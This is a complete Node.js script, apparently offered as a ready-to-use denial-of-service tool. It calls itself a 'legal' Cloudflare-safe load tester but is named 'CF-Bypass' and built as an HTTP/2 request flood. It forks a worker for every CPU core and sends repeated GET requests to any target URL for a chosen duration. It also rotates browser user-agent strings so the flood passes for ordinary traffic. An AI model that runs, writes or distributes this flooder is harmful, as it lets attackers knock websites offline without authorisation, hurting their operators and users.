// cf-bypass-http2.js
// Legal HTTP/2 Cloudflare-safe Load Tool (no root needed)

const http2 = require('http2');
const { URL } = require('url');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]) || 100;

if (!target || !duration) {
  console.log('Usage: node cf-bypass-http2.js <url> <duration_in_sec> [requests_per_second]');
  process.exit(1);
}

const threads = os.cpus().length;
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0'
];

function sendRequest(url) {
  const { hostname, pathname, search } = new URL(url);
  const client = http2.connect(`https://${hostname}`, {
    maxSessionMemory: 16384,
    settings: { enablePush: false },
  });

  const headers = {
    ':method': 'GET',
    ':path': pathname + search,
    ':scheme': 'https',
    ':authority': hostname,
    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9'
  };

  const req = client.request(headers);
  req.setEncoding('utf8');

  req.on('data', () => {});
  req.on('end', () => client.close());
  req.end();
  req.on('error', () => client.close());
}

function runFlood() {
  const end = Date.now() + duration * 1000;
  const interval = setInterval(() => {
    if (Date.now() > end) {
      clearInterval(interval);
      process.exit();
    }

    for (let i = 0; i < rate; i++) {
      sendRequest(target);
    }
  }, 1000);
}

if (cluster.isMaster) {
  console.log(`\n🚀 CF-Bypass HTTP/2 started:`);
  console.log(`▶ Target: ${target}`);
  console.log(`▶ Duration: ${duration}s`);
  console.log(`▶ Threads: ${threads}`);
  console.log(`▶ Rate per thread: ${rate}/s`);

  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
} else {
  runFlood();
}
